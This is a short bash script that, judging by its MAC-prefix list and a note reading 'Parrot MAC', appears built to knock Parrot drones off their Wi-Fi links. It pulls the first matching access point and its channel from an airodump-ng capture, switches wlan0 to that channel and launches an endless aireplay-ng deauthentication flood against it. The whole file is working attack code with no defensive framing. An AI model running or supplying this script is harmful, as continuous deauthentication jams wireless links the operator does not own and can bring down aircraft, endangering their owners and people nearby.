#!/bin/bash

pkill xterm
pkill airodump
apMAC=$(grep -m 1 -Eo "12:0F:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
apCh=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 4)


if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "90:03:B7:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "A0:14:3D:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "00:26:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "00:12:1C:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "90:3A:E6:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

echo $apCh
sudo ifconfig wlan0 down
sudo iwconfig wlan0 channel $apCh
sudo xterm -hold -e aireplay-ng -0 0 -a $apMAC wlan0


12:0F:7E - Parrot MAC
